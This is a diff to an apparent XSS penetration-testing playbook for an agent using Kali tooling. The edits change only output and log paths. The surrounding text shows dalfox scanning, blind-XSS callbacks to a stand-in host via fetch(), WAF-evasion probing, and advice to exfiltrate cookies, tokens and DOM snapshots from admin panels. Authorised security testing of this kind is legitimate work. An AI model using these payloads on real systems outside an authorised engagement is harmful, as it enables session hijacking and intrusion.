@@ -58,7 +58,7 @@ cat urls_with_params.txt | dalfox pipe --silence
 dalfox url "https://TARGET/search?q=test" --blind "$OOB_CALLBACK_URL"
 
 # JSON output for triage
-dalfox url "https://TARGET/page?param=test" -o /engagement/scans/xss_results.json --format json
+dalfox url "https://TARGET/page?param=test" -o /engagements/$ENGAGEMENT_KEY/scans/xss_results.json --format json
 
 # WAF fingerprinting (run before payload selection)
 dalfox url "https://TARGET/search?q=test" --waf-evasion
@@ -267,7 +267,7 @@ fetch('https://YOUR_OOB_CALLBACK/hit', {
 ### Operational Notes
 
 - **Timing**: Some blind XSS triggers days or weeks after injection. A support ticket might sit in a queue for a week before an admin opens it. Log viewers might only be checked during incident response. Set callbacks and be patient.
-- **Callback verification**: After injecting, check OOB logs periodically (`tail -50 /data/oob-client.log` via Kali MCP). A hit proves the payload rendered in an internal context.
+- **Callback verification**: After injecting, check the named OOB client log periodically (`tail -50 /data/oob/clients/<name>.log` via Kali MCP), or ask the operator for `aith oob client logs <name>`. A hit proves the payload rendered in an internal context.
 - **Impact escalation**: A blind XSS in an admin panel is not just "XSS." If the admin panel has: user management (account takeover), payment processing (financial impact), server configuration (RCE chain), or API key management (full compromise) — the XSS inherits that blast radius.
 - **Evidence capture**: The callback payload should exfil enough context to prove impact: the URL where it fired (shows it was admin panel), cookies/tokens (shows session hijack is possible), and a DOM snapshot (shows what the admin sees).
 
